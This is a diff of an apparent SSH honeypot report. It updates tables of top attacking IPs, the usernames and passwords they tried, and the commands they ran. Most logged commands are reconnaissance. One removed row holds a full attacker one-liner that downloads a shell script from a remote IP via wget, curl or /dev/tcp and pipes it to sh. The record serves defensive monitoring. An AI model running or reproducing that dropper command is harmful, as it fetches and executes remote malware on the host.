@@ -13,52 +13,60 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 125.70.52.249 | 17270 |
-| 8.210.118.192 | 2734 |
-| 47.239.201.124 | 2159 |
-| 47.236.150.50 | 607 |
-| 154.216.19.22 | 168 |
-| 182.92.184.12 | 159 |
-| 36.133.216.89 | 119 |
-| 39.107.96.168 | 114 |
-| 222.107.156.227 | 104 |
-| 96.78.175.36 | 104 |
+| 8.136.191.133 | 4896 |
+| 120.24.144.195 | 4693 |
+| 8.219.99.214 | 4476 |
+| 166.157.187.161 | 4469 |
+| 8.141.56.237 | 3965 |
+| 47.242.203.186 | 3052 |
+| 87.120.113.180 | 1618 |
+| 47.109.190.196 | 418 |
+| 182.92.184.12 | 318 |
+| 101.200.46.149 | 289 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| ubuntu | 731 |
-| admin | 719 |
-| guest | 715 |
-| user | 715 |
-| debian | 713 |
-| dev | 713 |
-| ftp | 713 |
-| huawei | 713 |
-| inspur | 713 |
-| web | 713 |
+| root | 942 |
+| csgoserver | 507 |
+| bob | 503 |
+| andre | 502 |
+| chrome | 355 |
+| 111111 | 152 |
+| ubuntu | 119 |
+| admin | 46 |
+| test | 36 |
+| root1 | 32 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 199 |
-| password | 116 |
-| 123 | 40 |
-| 1 | 40 |
-| 123456789 | 33 |
-| 111111 | 33 |
-| 1234 | 32 |
-| 12345 | 28 |
-| test123 | 27 |
-| root | 26 |
+| 123456 | 202 |
+| 123 | 142 |
+| P@ssw0rd | 117 |
+| Password1 | 97 |
+| 1 | 61 |
+| 123123 | 31 |
+| password | 28 |
+| 111111 | 26 |
+| 1234 | 24 |
+| 123456789 | 22 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 113.44.46.107 | uname -s -m |
+| 120.27.146.94 | uname -s -m |
+| 87.120.113.180 | uname -s -v -n -r |
+| 87.120.113.180 | grep "model name" /proc/cpuinfo \| cut -d ' ' -f3- \| awk '{print $1,$2,$3,$4,$5,$6,$7,$8,$9,$10}' \| head -1 |
+| 87.120.113.180 | nproc |
+| 193.222.99.139 | uname -s -m |
+| 117.83.194.85 | uname -s -m |
 | 182.92.184.12 | uname -s -m |
-| 87.120.113.231 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
-| 182.92.210.172 | uname -s -m |
+| 120.27.120.108 | uname -s -m |
+| 87.120.113.180 | uname -s -v -n -r |
+| 87.120.113.180 | grep "model name" /proc/cpuinfo \| cut -d ' ' -f3- \| awk '{print $1,$2,$3,$4,$5,$6,$7,$8,$9,$10}' \| head -1 |
+| 87.120.113.180 | nproc |
+| 182.92.184.12 | uname -s -m |
